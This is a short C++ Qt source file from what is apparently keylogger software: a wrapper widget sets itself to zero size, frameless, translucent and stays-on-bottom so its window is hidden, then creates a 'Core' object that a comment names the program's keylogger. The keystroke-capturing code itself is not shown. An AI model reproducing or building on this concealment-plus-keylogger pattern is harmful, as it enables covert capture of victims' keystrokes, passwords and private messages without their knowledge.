#include "wrapper.h"

Wrapper::Wrapper(QWidget *parent) :
    QWidget(parent)
{
    /**
     * @brief Making the wrapper window transparent as possible.
     */
    setParent(nullptr);
    setFixedSize(0, 0);

    if (EXTRA_TRANSPARENCY) {
        setWindowFlags(Qt::Widget | Qt::FramelessWindowHint | Qt::SubWindow | Qt::WindowStaysOnBottomHint);
        setAttribute(Qt::WA_NoSystemBackground, true);
        setAttribute(Qt::WA_TranslucentBackground, true);
        setAttribute(Qt::WA_ShowWithoutActivating);
    }

    /**assss
     * @brief The core compontent (Keylogger) of the program.
     */
    Core *core = new Core(this);
}
